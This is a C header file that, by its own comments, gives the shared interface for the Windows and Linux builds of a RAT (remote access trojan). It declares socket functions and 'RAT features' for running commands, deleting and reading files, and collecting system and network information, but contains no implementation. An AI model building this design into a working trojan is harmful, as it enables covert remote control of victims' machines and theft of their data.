/* Common Interface for windows.c and linux.c */

/* Preprocessor conditionals to specify abstract return type based on platform */
#if _WIN32
    typedef SOCKET Hndl;

#elif __linux__
    typedef int Hndl;

#endif

/* Function prototypes for socket IO */
Hndl create_socket(const char *host, int port);
Hndl bind_socket(int port, int sockfd);
Hndl listen_socket(int max_connections, int sockfd);
Hndl accept_socket(int sockfd, int port);
Hndl read_socket(int sockfd, char buffer[], int len);

/* Function prototypes for RAT features */
void run_command(int sockfd, const char *argument);
void delete_file(int sockfd, const char *argument);
void system_info(int sockfd);
void networking_info(int sockfd);
void read_file(int sockfd, const char *filepath);

const char *parse_feature(char input[]);
const char *parse_argument(char input[]);
